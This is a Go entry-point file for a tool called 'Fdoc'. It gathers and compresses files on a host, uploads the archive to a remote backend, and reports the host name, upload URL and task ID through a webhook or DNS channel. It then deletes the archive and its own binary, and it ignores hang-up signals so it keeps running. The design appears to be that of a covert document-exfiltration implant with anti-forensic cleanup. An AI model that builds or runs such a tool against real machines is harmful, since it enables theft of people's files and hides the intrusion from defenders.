package main

import (
	"Fdoc/logx"
	"Fdoc/option"
	"Fdoc/pkg"
	"Fdoc/pkg/callback"
	"Fdoc/pkg/scrub"
	"Fdoc/pkg/upload"
	"context"
	"fmt"
	"os"
	"time"
)

func main() {
	info := &option.FlagInfo{}
	info.InitFlag()

	if info.Upload {
		pkg.IgnoreSIGHUP()
	}

	startTime := time.Now()
	result := pkg.WalkAndCompress(info)
	logx.Info("Execution time: %v", time.Since(startTime))

	if result.Err != nil {
		logx.Error("%v", result.Err)
		os.Exit(1)
	}

	if !info.Upload {
		if result.Truncated {
			os.Exit(2)
		}
		os.Exit(0)
	}

	if result.MatchedFiles == 0 || result.OutputPath == "" {
		logx.Error("nothing to upload (no packed files)")
		os.Exit(1)
	}

	upRes, err := upload.File(result.OutputPath, upload.Options{
		Backend:    info.Backend,
		Force:      info.Force,
		Quiet:      info.Quiet,
		Encrypt:    info.Encrypt,
		EncryptKey: info.EncryptKey,
	})
	if err != nil {
		logx.Error("upload: %v", err)
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "UPLOAD_OK backend=%s url=%s\n", upRes.Backend, upRes.URL)

	host, _ := os.Hostname()
	cbRes, err := callback.Notify(context.Background(), callback.Payload{
		TaskID:    info.TaskID,
		Host:      host,
		URL:       upRes.URL,
		Backend:   upRes.Backend,
		Archive:   result.OutputPath,
		Size:      result.ArchiveBytes,
		Files:     result.MatchedFiles,
		Truncated: result.Truncated,
		TS:        time.Now().Unix(),
	}, callback.Options{
		Webhook: info.Webhook,
		DNS:     info.DNS,
		Timeout: info.CBTimeout,
	})
	if err != nil {
		logx.Error("callback: %v", err)
		os.Exit(1)
	}
	logx.Info("callback ok webhook=%v dns=%v", cbRes.WebhookOK, cbRes.DNSOK)

	// Scrub only after a fully successful callback (webhook 2xx, or all DNS chunks sent).
	if info.Scrub && (cbRes.WebhookOK || cbRes.DNSOK) {
		scrub.Run(scrub.Options{
			Archive: result.OutputPath,
			Self:    true,
		})
	}

	if result.Truncated {
		os.Exit(2)
	}
}
